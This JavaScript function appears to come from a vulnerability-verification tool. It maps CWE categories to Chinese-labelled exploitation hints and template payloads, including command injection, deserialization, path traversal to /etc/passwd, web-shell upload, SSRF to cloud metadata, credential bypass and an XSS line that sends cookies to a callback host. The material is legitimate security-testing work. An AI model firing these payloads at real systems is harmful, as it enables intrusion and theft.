
export function buildGuidance(c) {
  const t = ((c.desc || "") + " " + (c.title || "")).toLowerCase();
  const cwe = (c.cwe || "").split(",")[0].trim();
  const has = (ks) => ks.some((k) => t.includes(k));
  const v = { type: "通用逻辑缺陷", prereq: ["确认版本落在受影响区间", "按公告触发条件构造最小验证"], payload: ["curl -s '<endpoint>' -D-"] };

  if (["CWE-78","CWE-77","CWE-94","CWE-502","CWE-917","CWE-1336"].includes(cwe) || has(["remote code execution","command injection","deserialization","template injection","expression language"]))
    return { type: "远程代码执行 / 命令注入", prereq: ["目标组件对外开放且版本落在受影响区间","存在可控输入进入命令拼接、序列化入口或模板求值点","准备 DNS/HTTP 带外回连确认无回显执行"], payload: ["curl -s '<endpoint>?p=;id'","curl -s '<endpoint>' -d '{\"@type\":\"java.net.Inet4Address\",\"val\":\"<collab>\"}'","nuclei -u <target> -tags rce"] };
  if (cwe === "CWE-89" || has(["sql injection"]))
    return { type: "SQL 注入", prereq: ["定位可控参数进入 SQL 语句","判断数据库类型与堆叠查询能力"], payload: ["sqlmap -u '<url>?id=1' --batch --dbs","curl -s '<url>?id=1%27'"] };
  if (["CWE-22","CWE-23","CWE-35","CWE-73"].includes(cwe) || has(["path traversal","directory traversal","arbitrary file read"]))
    return { type: "路径穿越 / 任意文件读取", prereq: ["找到接收文件名或路径的参数","确认目标文件权限与绝对路径"], payload: ["curl -s '<url>?file=../../../../etc/passwd'","curl -s '<url>?file=..%2f..%2fetc%2fpasswd'"] };
  if (["CWE-434","CWE-646"].includes(cwe) || has(["unrestricted file upload","arbitrary file upload"]))
    return { type: "任意文件上传", prereq: ["确认上传目录可 Web 访问","准备多种扩展名与 Content-Type 组合"], payload: ["curl -F 'file=@shell.php;type=image/jpeg' '<upload>'","curl -X PUT '<path>/shell.jsp' --data-binary @shell.jsp"] };
  if (cwe === "CWE-918" || has(["server-side request forgery","ssrf"]))
    return { type: "服务端请求伪造", prereq: ["找到服务端发起请求的参数","测试内网与云元数据可达性"], payload: ["curl -s '<url>?url=http://169.254.169.254/latest/meta-data/'","curl -s '<url>?url=http://<collab>/x'"] };
  if (["CWE-287","CWE-288","CWE-306","CWE-639","CWE-862","CWE-863","CWE-798"].includes(cwe) || has(["authentication bypass","authorization bypass","unauthorized access","hard-coded"]))
    return { type: "认证 / 授权绕过", prereq: ["梳理鉴权链路与默认凭据","准备未授权与越权两类用例"], payload: ["curl -s '<admin>' -H 'X-Forwarded-For: 127.0.0.1'","curl -s -u 'admin:admin' '<admin>'","jwt_tool <token> -X a"] };
  if (["CWE-79","CWE-80"].includes(cwe) || has(["cross-site scripting"]))
    return { type: "跨站脚本", prereq: ["确认输出上下文与 CSP","存储型需找到管理员查看页面"], payload: ["dalfox url '<url>' --deep-domxss","<img src=x onerror=fetch('http://<collab>/'+document.cookie)>"] };
  if (["CWE-119","CWE-120","CWE-121","CWE-122","CWE-125","CWE-787","CWE-416"].includes(cwe) || has(["buffer overflow","use-after-free","out-of-bounds"]))
    return { type: "内存破坏", prereq: ["确认架构与保护机制","准备可控长度的崩溃样本"], payload: ["python3 -c \"print('A'*4096)\" | nc <ip> <port>","checksec --file=<binary>"] };
  if (["CWE-400","CWE-776","CWE-1333"].includes(cwe) || has(["denial of service"]))
    return { type: "拒绝服务", prereq: ["小流量试探确认可重复触发","记录响应时间与资源变化"], payload: ["curl -s '<url>' --data '<!DOCTYPE l [<!ENTITY a \"aaaa\">]>'","ab -n 200 -c 50 '<url>'"] };
  if (["CWE-200","CWE-209","CWE-532"].includes(cwe) || has(["information disclosure","sensitive information"]))
    return { type: "敏感信息泄露", prereq: ["枚举调试端点与备份文件","确认泄露内容含凭据或内网地址"], payload: ["curl -s '<base>/actuator/env'","curl -s '<base>/.git/config'"] };
  if (cwe === "CWE-352" || has(["cross-site request forgery"]))
    return { type: "跨站请求伪造", prereq: ["确认仅依赖 Cookie 且无 SameSite","准备自动提交页面"], payload: ["<form action='<target>' method=POST id=f></form><script>f.submit()</script>"] };
  return v;
}
